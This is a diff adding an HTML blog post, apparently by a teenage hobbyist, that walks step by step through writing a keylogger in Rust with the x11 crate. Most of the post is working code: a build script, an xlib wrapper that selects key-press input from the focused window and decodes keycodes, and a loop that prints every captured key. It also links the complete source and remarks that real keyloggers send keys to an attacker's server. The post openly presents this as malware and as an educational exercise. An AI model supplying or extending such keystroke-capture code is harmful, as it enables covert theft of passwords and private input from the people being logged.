@@ -1,0 +1,284 @@
+
+<html>
+    <head>
+        <title>Writing a keylogger in Rust - Proxin</title>
+        <link rel="stylesheet" href="../index.css">
+    </head>
+    <body>
+        <div class="left-bar">
+            <a href="../index.html"><img src="../assets/tux.png"></a>
+
+            <h1>Proxin</h1>
+            <p>15 year old, norway</p>
+        </div>
+        <div class="content">
+            <h1>Writing a keylogger in Rust</h1>
+            <p>
+                A keylogger is a very common type of malware but how are they implemented,
+                in order to answer this question im going to step-by-step show how a keylogger
+                can be implemented using the <a href="https://github.com/AltF02/x11-rs">x11</a> crate with the rust programing language.
+            </p>
+
+            <h1>Project Setup</h1>
+            <p>
+                To start you need to create a rust project with the following file structure.
+            </p>
+
+            <pre>
+                ├── build.rs
+                ├── Cargo.lock
+                ├── Cargo.toml
+                ├── LICENSE
+                ├── README.md
+                └── src
+                    ├── main.rs
+                    └── xlib
+                        └── mod.rs
+            </pre>
+
+            <p>
+                Before we can start using the library we need to link with X11,
+                for this we use a build script, type the following into your build.rs file to link with X11.
+
+            </p>
+
+            <pre>
+                fn main() {
+                    println!("cargo:rustc-link-lib=X11");
+                }
+            </pre>
+
+            <p>
+                Last but not least we need to add the <a href="https://github.com/AltF02/x11-rs">x11</a> crate to our dependencies,
+                this can be done using the following shell command.
+            </p>
+
+            <pre>
+                cargo add x11
+            </pre>
+
+            <h1>Creating a safe xlib wrapper</h1>
+
+            <p>
+                Now for creating the program, we are going to start by creating a safe wrapper around all the functions we need from x11.
+                <br>
+                <br>
+                To start we are going to define a Display structure which holds a raw mutable pointer to our XDisplay.
+            </p>
+
+            <pre>
+                use x11::xlib;
+
+                use std::ffi::CStr;
+                use std::ptr;
+                use std::mem;
+
+                pub struct Display {
+                    dpy: *mut xlib::_XDisplay,
+                }
+            </pre>
+
+            <p>
+                After creating the Display structure we want to be able to open a new display and close it later.
+                <br>
+                <br>
+                We are going to do this through the <a href="https://tronche.com/gui/x/xlib/display/opening.html">XOpenDisplay</a>
+                and <a href="https://tronche.com/gui/x/xlib/display/XCloseDisplay.html">XCloseDisplay</a> functions from xlib.
+                <br>
+                <br>
+                First we are going to implement the ability to open a display with the following function.
+            </p>
+
+            <pre>
+                impl Display {
+                    pub fn open() -&gt; Result&lt;Display, Box&lt;dyn std::error::Error&gt;&gt; {
+                        unsafe {
+                            let dpy = xlib::XOpenDisplay(ptr::null());
+
+                            if dpy.is_null() {
+                                Err("xlib::XOpenDisplay returned null".into())
+                            } else {
+                                Ok(Display {
+                                    dpy,
+                                })
+                            }
+                        }
+                    }
+
+                    ...
+                }
+            </pre>
+
+            <p>
+                Next we want the Display to automatically close once it goes out of scope,
+                this can be done using the Drop trait in rust,
+            </p>
+
+            <pre>
+                impl Drop for Display {
+                    fn drop(&mut self) {
+                        unsafe {
+                            xlib::XCloseDisplay(self.dpy);
+                        }
+                    }
+                }
+            </pre>
+
+            <p>
+                Now that we have implemented the basic functions we need to add support for
+                getting input from the current focused window.
+                <br>
+                <br>
+                This can be done using the <a href="https://tronche.com/gui/x/xlib/input/XGetInputFocus.html">XGetInputFocus</a> function to get the focused window
+                and <a href="https://tronche.com/gui/x/xlib/event-handling/XSelectInput.html">XSelectInput</a> to tell x11 that we want input from that window.
+                <br>
+                <br>
+                In the following source we are passing KeyPressMask to XSelectInput in order to tell it that
+                we are only interested in key presses.
+            </p>
+
+            <pre>
+                impl Display {
+                    ...
+
+                    pub fn grab_input(&mut self) {
+                        unsafe {
+                            let mut focused = 0u64;
+                            let mut revert_to = 0i32;
+
+                            xlib::XGetInputFocus(self.dpy, &mut focused, &mut revert_to);
+                            xlib::XSelectInput(self.dpy, focused, xlib::KeyPressMask);
+                    }
+
+                    ...
+                }
+            </pre>
+
+            <p>
+                Next we need to be able to poll events, xlib doesnt have a poll_events function by default but this can easily
+                be implemented using <a href="https://tronche.com/gui/x/xlib/event-handling/XPending.html">XPending</a>
+                to check how many events are pending
+                and <a href="https://tronche.com/gui/x/xlib/event-handling/manipulating-event-queue/XNextEvent.html">XNextEvent</a>
+                to get the next event.
+            </p>
+
+            <pre>
+                impl Display {
+                    ...
+
+                    pub fn poll_event(&mut self) -&gt; Option<xlib::XEvent> {
+                        unsafe {
+                            if xlib::XPending(self.dpy) &gt; 0 {
+                                let mut event: xlib::XEvent = mem::zeroed();
+                                xlib::XNextEvent(self.dpy, &mut event);
+
+                                Some(event)
+                            } else {
+                                None
+                            }
+                        }
+                    }
+
+                    ...
+                }
+            </pre>
+
+            <p>
+                Finally for the xlib wrapper we need a function which converts a keycode to a string,
+                for this we are going to use <a href="https://tronche.com/gui/x/xlib/utilities/keyboard/XKeysymToString.html">XKeysymToString</a>
+                and <a href="https://tronche.com/gui/x/xlib/utilities/keyboard/XKeycodeToKeysym.html">XKeycodeToKeysym</a>.
+            </p>
+
+            <pre>
+                impl Display {
+                    ...
+
+                    pub fn keycode_to_string(&mut self, keycode: u8) -&gt; &str {
+                        unsafe {
+                            CStr::from_ptr(xlib::XKeysymToString(xlib::XKeycodeToKeysym(self.dpy, keycode, 0)))
+                                .to_str()
+                                .unwrap_or_default()
+                        }
+                    }
+                }
+            </pre>
+
+            <h1>Putting it together</h1>
+
+            <p>
+                Now that we have a safe xlib wrapper, we can finally put it together.
+                <br>
+                <br>
+                To start we will use the xlib wrapper we created as a module.
+            </p>
+
+            <pre>
+                mod xlib;
+
+                use xlib::Display;
+
+                use std::process;
+            </pre>
+
+            <p>
+                Next we create a Display instance inside the main function.
+            </p>
+
+            <pre>
+                fn main() {
+                    let mut display = match Display::open() {
+                        Ok(display) =&gt; display,
+                        Err(err) =&gt; {
+                            println!("[ERROR] failed to open display: {}", err.to_string());
+                            process::exit(1);
+                        },
+                    };
+
+                    ...
+                }
+            </pre>
+
+            <p>
+                Now that we have a Display instance inside the display variable we
+                can create the main loop where we capture key presses.
+            </p>
+
+            <pre>
+                fn main() {
+                    ...
+
+                    loop {
+                        display.grab_input();
+
+                        if let Some(event) = display.poll_event() {
+                            match unsafe { event.type_ } {
+                                x11::xlib::KeyPress =&gt; {
+                                    unsafe {
+                                        println!("key: {}", display.keycode_to_string(event.key.keycode as u8));
+                                    }
+                                },
+                                _ =&gt; {},
+                            }
+                        }
+                    }
+                }
+            </pre>
+
+            <h1>Summary</h1>
+
+            <p>
+                To sum up writting a keylogger is quite easy so no wonder why its so commonly used by criminals,
+                thats not to say that there couldn't be improvments to my keylogger, for example in a real world scenario
+                the keylogger would most likely connect to some sort of server so that keys could be sendt over to the attacker,
+                in addition to this there would most likely also be support for other windowing system such as wayland.
+                <br>
+                <br>
+                The complete source code can be found <a href="https://github.com/proxin187/clog">here</a>
+            </p>
+
+            <h4>Copyright 2024 Proxin</h4>
+        </div>
+    </body>
+</html>
+
+
